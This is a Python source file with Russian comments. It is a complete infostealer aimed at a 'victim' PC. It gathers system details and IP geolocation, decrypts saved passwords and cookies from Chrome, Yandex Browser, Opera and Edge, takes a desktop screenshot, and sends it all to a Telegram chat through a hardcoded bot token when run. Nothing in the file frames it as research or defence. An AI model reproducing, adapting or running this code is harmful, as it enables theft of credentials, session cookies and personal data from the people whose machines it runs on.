# version 1.0 
# 
# импорт необходимых модулей 
from ip2geotools.databases.noncommercial import DbIpCity
from PIL import ImageGrab
from uuid import getnode as get_mac 
from datetime import datetime 
import win32crypt
import telebot 
import ip2geotools 
import platform 
import os 
import sys 
import requests 
import getpass 
import time 
import sqlite3
import psutil 

#########################################################################
#                      Сбор информации о ПК жертвы                      #
#########################################################################
def get_data():
    response = DbIpCity.get(requests.get("https://ip.beget.ru").text, api_key = "free") 
    mac_address = get_mac() # получаем Mac-адрес компьютера
    op = platform.uname() # имя операционной системы 
    cpu = psutil.cpu_freq() # частота процессора 
    zone = psutil.boot_time() # узнаем время на компьютере 
    time = datetime.fromtimestamp(zone) # переводим полученные данные в читабельный вид 
    comp_data = f" Операционная система: {op.system}\n Процессор: {op.processor}\n Максимальная частота: {cpu.max:.2f} Mhz\n Минимальная частота: {cpu.min:.2f} Mhz\n Текущая частота: {cpu.current:.2f} Mhz\n Имя: {getpass.getuser()}\n Mac-адрес: {mac_address}\n"
    geo_data = f" IP-адрес: {response.ip_address}\n Страна: {response.country}\n Регион: {response.region}\n Город: {response.city}\n Дата: {time.month}/{time.day}/{time.year}\n Время: {time.hour}:{time.minute}:{time.second}"
    all_data = comp_data + geo_data 
    
    return all_data
    
#########################################################################
#                      Делаем снимки рабочего стола                     #
#########################################################################
def screenshot():
    screen = ImageGrab.grab()
    screen.save("screen.png") 
    

#########################################################################
#                      Вытаскиваем пароли Google Chrome                 #
#########################################################################
def get_passwd_chrome():
    result = "|URL|LOGIN|PASSWORD|\n"
    if os.path.exists(os.getenv("APPDATA") + "\\..\\Local\\Google\\Chrome\\User Data\\Default\\" + "Login Data"):
        # подключаемся к базе данных
        
        c0nnect = sqlite3.connect(os.getenv("APPDATA") + "\\..\\Local\\Google\\Chrome\\User Data\\Default\\" + "Login Data")
        if c0nnect == None:
            return f"Не удалось установить соединение с базой данных!"
        # создаем объект для взаимодействия с базой данных
        curs0r = c0nnect.cursor()
        try:
            curs0r.execute("SELECT action_url, username_value, password_value FROM logins")

            for el in curs0r.fetchall():
                url = el[0]
                login = el[1]
                d3cryptpasswd = win32crypt.CryptUnprotectData(el[2])[1].decode()

                result += f"|{url}|{login}|{d3cryptpasswd}|"
        except:
            result += f"|######|######|#####|"

        return f"---------------------------- Пароли Google Chrome ----------------------------\n{result}"
    return "Google Chrome не установлен или не найден Login Data"

    
#########################################################################
#                      Вытаскиваем пароли Yandex                        #
#########################################################################
def get_passwd_yandex():
    result = "|URL|LOGIN|PASSWORD|\n"
    if os.path.exists(os.getenv("APPDATA") + "\\..\\Local\\Yandex\\YandexBrowser\\User Data\\Default\\" + "Login Data"):
        # подключаемся к базе данных
     
        c0nnect = sqlite3.connect(os.getenv("APPDATA") + "\\..\\Local\\Yandex\\YandexBrowser\\User Data\\Default\\" + "Login Data")
        if c0nnect == None:
            return f"Не удалось установить соединение с базой данных!"
        # создаем объект для взаимодействия с базой данных
        curs0r = c0nnect.cursor()
        try:
            curs0r.execute("SELECT action_url, username_value, password_value FROM logins")
            
            for el in curs0r.fetchall():
                url = el[0]
                login = el[1]
                d3cryptpasswd = win32crypt.CryptUnprotectData(el[2])[1].decode()

                result += f"|{url}|{login}|{d3cryptpasswd}|"
        except:
            result += f"|######|######|######|"
        return f"---------------------------- Пароли Yandex Browser ----------------------------\n{result}"
    return "Яндекс Браузер не установлен или не найден Login Data" 

#########################################################################
#                      Вытаскиваем пароли Opera                         #
#########################################################################
def get_passwd_opera():
    result = "|URL|LOGIN|PASSWORD|\n"
    if os.path.exists(os.getenv("APPDATA") + "\\..\\Roaming\\Opera Software\\Opera Stable\\" + "Login Data"):
        # подключаемся к базе данных

        c0nnect = sqlite3.connect(os.getenv("APPDATA") + "\\..\\Roaming\\Opera Software\\Opera Stable\\" + "Login Data")
        if c0nnect == None:
            return f"Не удалось установить соединение с базой данных!"
        # создаем объект для взаимодействия с базой данных
        curs0r = c0nnect.cursor()
        try:
            curs0r.execute("SELECT action_url, username_value, password_value FROM logins")
            
            for el in curs0r.fetchall():
                url = el[0]
                login = el[1] 
                d3cryptpasswd = win32crypt.CryptUnprotectData(el[2])[1].decode()

                result += f"|{url}|{login}|{d3cryptpasswd}|"
        except:
            result += f"|######|######|######|"

        return f"---------------------------- Пароли Opera ----------------------------\n{result}"
    return "Opera не установлен или не найден Login Data"

#########################################################################
#                   Вытаскиваем пароли Microsoft Edge                   #
#########################################################################
def get_passwd_edge():
    result = "|URL|LOGIN|PASSWORD|\n"
    if os.path.exists(os.getenv("APPDATA") + "\\..\\Local\\MicrosoftEdge\\User\\Default\\" + "Login Data"):
        # подключаемся к базе данных

        c0nnect = sqlite3.connect(os.getenv("APPDATA") + "\\..\\Local\\MicrosoftEdge\\User\\Default\\" + "Login Data")
        if c0nnect == None:
            return f"Не удалось установить соединение с базой данных!"
        # создаем объект для взаимодействия с базой данных
        curs0r = c0nnect.cursor()
        try:
            curs0r.execute("SELECT action_url, username_value, password_value FROM logins")
            
            for el in curs0r.fetchall():
                url = el[0]
                login = el[1] 
                d3cryptpasswd = win32crypt.CryptUnprotectData(el[2])[1].decode()

                result += f"|{url}|{login}|{d3cryptpasswd}|"
        except:
            result += f"|######|######|######|"

        return f"---------------------------- Пароли Microsoft Edge ----------------------------\n{result}"
    return "Microsoft Edge не установлен или найден Login Data"

#########################################################################
#                      Вытаскиваем cookie Google Chrome                 #
#########################################################################
def get_cookie_chrome():
    result = "|URL|COOKIE|COOKIE NAME|\n"
    if os.path.exists(os.getenv("APPDATA") + "\\..\\Local\\Google\\Chrome\\User Data\\Default\\" + "Cookies"):
        # подключаемся к базе данных

        c0nnect = sqlite3.connect(os.getenv("APPDATA") + "\\..\\Local\\Google\\Chrome\\User Data\\Default\\" + "Cookies")
        if c0nnect == None:
            return f"Не удалось установить соединение с базой данных!"
        # создаем объект для взаимодействия с базой данных
        curs0r = c0nnect.cursor()
        try:
            curs0r.execute("SELECT * from cookies")
            
            for el in curs0r.fetchall():
                url = el[1]
                cookie_name = el[2] 
                d3cryptcookie = win32crypt.CryptUnprotectData(el[12])[1].decode()

                result += f"|{url}|{cookie_name}|{d3cryptcookie}|"
        except:
            result += f"|######|######|######|"

        return f"---------------------------- COOKIE Google Chrome ----------------------------\n{result}"
    return "Не найдены Cookies Google Chrome"
    

#########################################################################
#                      Вытаскиваем cookie Yandex                        #
#########################################################################
def get_cookie_yandex():
    result = "|URL|COOKIE|COOKIE NAME|\n"
    if os.path.exists(os.getenv("APPDATA") + "\\..\\Local\\Yandex\\YandexBrowser\\User Data\\Default\\" + "Cookies"):
        # подключаемся к базе данных

        c0nnect = sqlite3.connect(os.getenv("APPDATA") + "\\..\\Local\\Yandex\\YandexBrowser\\User Data\\Default\\" + "Cookies")
        if c0nnect == None:
            return f"Не удалось установить соединение с базой данных!"
        # создаем объект для взаимодействия с базой данных
        curs0r = c0nnect.cursor()
        try:
            curs0r.execute("SELECT * from cookies")
            
            for el in curs0r.fetchall():
                url = el[0]
                cookie_name = el[1] 
                d3cryptcookie = win32crypt.CryptUnprotectData(el[12])[1].decode()

                result += f"|{url}|{cookie_name}|{d3cryptcookie}|"
        except:
            result += f"|######|######|######|"

        return f"---------------------------- COOKIE Yandex Browser ----------------------------\n{result}"
    return "Не найдены Cookies Yandex Browser"

#########################################################################
#                       Вытаскиваем cookie Opera                        #
#########################################################################
def get_cookie_opera():
    result = "|URL|COOKIE|COOKIE NAME|\n"
    if os.path.exists(os.getenv("APPDATA") + "\\..\\Roaming\\Opera Software\\Opera Stable\\" + "Cookies"):
        # подключаемся к базе данных

        c0nnect = sqlite3.connect(os.getenv("APPDATA") + "\\..\\Roaming\\Opera Software\\Opera Stable\\" + "Cookies")
        if c0nnect == None:
            return f"Не удалось установить соединение с базой данных!"
        # создаем объект для взаимодействия с базой данных
        curs0r = c0nnect.cursor()
        try:
            curs0r.execute("SELECT * from cookies")
            
            for el in curs0r.fetchall():
                url = el[1]
                cookie_name = el[2] 
                d3cryptcookie = win32crypt.CryptUnprotectData(el[12])[1].decode()

                result += f"|{url}|{cookie_name}|{d3cryptcookie}|"
        except:
            result += f"|######|######|######|"

        return f"---------------------------- COOKIE Opera ----------------------------\n{result}"
    return "Не найдены Cookies Opera"
    
#########################################################################
#                     Вытаскиваем cookie Microsoft Edge                 #
#########################################################################
def get_cookie_edge():
    result = "|URL|COOKIE|COOKIE NAME|\n"
    if os.path.exists(os.getenv("APPDATA") + "\\..\\Local\\MicrosoftEdge\\User\\Default\\" + "Cookies"):
        # подключаемся к базе данных

        c0nnect = sqlite3.connect(os.getenv("APPDATA") + "\\..\\Local\\MicrosoftEdge\\User\\Default\\" + "Cookies")
        if c0nnect == None:
            return f"Не удалось установить соединение с базой данных!"
        # создаем объект для взаимодействия с базой данных
        curs0r = c0nnect.cursor()
        try:
            curs0r.execute("SELECT * from cookies")
            
            for el in curs0r.fetchall():
                url = el[1]
                cookie_name = el[2] 
                d3cryptcookie = win32crypt.CryptUnprotectData(el[12])[1].decode()

                result += f"|{url}|{cookie_name}|{d3cryptcookie}|"
        except:
            result += f"|######|######|######|"

        return f"---------------------------- COOKIE Microsoft Edge ----------------------------\n{result}"
    return "Не найдены Cookies Microsoft Edge"

#########################################################################
#                      Отправка полученных данных                       #
#########################################################################
def main(): 
    bot = telebot.TeleBot("1682325904:AAGZxqX1f5x956QkBfqDaxH_soyEoUuhFJY")
    
    bot.send_message(-1001342912509, get_data())
    bot.send_message(-1001342912509, get_passwd_chrome())
    bot.send_message(-1001342912509, get_passwd_yandex())
    bot.send_message(-1001342912509, get_passwd_opera())
    bot.send_message(-1001342912509, get_passwd_edge())
    bot.send_message(-1001342912509, get_cookie_chrome())
    bot.send_message(-1001342912509, get_cookie_yandex())
    bot.send_message(-1001342912509, get_cookie_opera())
    bot.send_message(-1001342912509, get_cookie_edge())
    time.sleep(20)
    screenshot()
    bot.send_photo(-1001342912509, photo = open("screen.png", "rb"))
    os.remove("screen.png")
    bot.polling()
    
main()
    
    
    
    
    
    
    
    
    
    
    
    
